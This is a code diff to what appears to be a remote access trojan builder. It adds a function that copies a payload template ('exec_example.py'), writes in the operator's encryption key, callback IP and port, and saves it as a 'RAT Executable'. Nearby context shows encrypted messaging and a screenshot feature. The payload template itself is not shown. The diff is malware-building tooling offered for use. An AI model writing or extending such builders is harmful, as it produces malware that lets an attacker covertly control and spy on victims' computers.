@@ -57,6 +57,9 @@ def decrypt_mess(message):
     decrypted_mess = f.decrypt(message)
     return decrypted_mess
 
+#read executable code file
+def read_code():
+    return open("exec_example.py", "rb").read()
 
 #### - GENERAL FUNCTIONS - ####
 def banner():
@@ -176,15 +179,32 @@ def find_Server():
 'current working on!'
 # Create exploit file
 def create_exploit():
-    print("\n>>> Writing Exploit")
+    print(CBLU + "\n[+] Creating RAT Executable" + CEND)
     print("Please Enter Your designated machine details.")
-    ip = input(": ")
-    port = input("desitnation port : ")
-    # write inputs to file.
-    # embeds current key in exploit
-    #
-    print("writing exploit to file...")
-    print("check folder")
+    ip = input(">>> IP address: ")
+    port = input(">>> Destination port : ")
+    name = input("enter file name: ")
+    name = name + ".py"
+    current_key = read_key()
+    code = read_code()
+    with open(name, "wb") as f:
+        f.write(code)
+    # read the new file lines
+    with open(name, "r") as f:
+       get_all = f.readlines()
+    # write inputs to new file.
+    with open(name, "w") as f:
+        for i, line in enumerate(get_all, 1):
+            if i == 14:
+                f.writelines("    key = " + str(current_key) + "\n")
+            elif i == 57:
+                f.writelines("      ip =" + "'" + ip + "'" + "\n")
+            elif i == 58:
+                f.writelines("      port = " + port + "\n")
+            else:
+                f.writelines(line)
+    print(CBLU + "[+] Writing Executable..." + CEND)
+    print("File Saved")
     menu()
 
 ### screen shot function ###
